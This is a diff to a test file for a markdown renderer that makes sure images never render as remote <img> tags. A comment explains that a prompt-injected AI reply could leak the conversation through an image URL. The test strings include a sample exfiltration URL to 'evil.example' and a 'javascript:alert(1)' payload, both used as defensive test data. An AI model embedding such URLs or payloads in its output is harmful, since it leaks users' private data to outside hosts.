@@ -300,10 +300,22 @@ def test_render_markdown_safe_links_open_in_new_tab() -> None:
     assert out.count('rel="noopener noreferrer nofollow"') == 2
 
 
-def test_render_markdown_http_image_allowed() -> None:
-    out = render_markdown("![cat](https://example.com/cat.png)")
-    assert '<img src="https://example.com/cat.png" alt="cat"' in out
-    assert 'referrerpolicy="no-referrer"' in out
+def test_render_markdown_never_loads_a_remote_image() -> None:
+    # A prompt-injected reply could smuggle the conversation out through the
+    # URL of an image the browser fetches by itself, so no <img> ever renders.
+    leak = "![cat](https://evil.example/cat.png?q=the+secret+plan)"
+    out = render_markdown(leak)
+    assert "<img" not in out and "src=" not in out
+    assert out == "<p>[image: cat] (https://evil.example/cat.png?q=the+secret+plan)</p>"
+    assert (
+        render_markdown("![](http://e.example/x.png)") == "<p>[image] (http://e.example/x.png)</p>"
+    )
+    ref = render_markdown('![a "b" <c>][1]\n\n[1]: https://e.example/i.png')
+    assert "<img" not in ref and "&lt;c&gt;" in ref
+    # Inside a link the link still works; the image inside it is still text.
+    linked = render_markdown("[![logo](https://e.example/l.png)](https://ok.example)")
+    assert '<a href="https://ok.example"' in linked and "<img" not in linked
+    assert render_markdown("![alt](javascript:alert(1))") == "<p>alt</p>"
 
 
 # -- render_markdown: formatting ----------------------------------------------
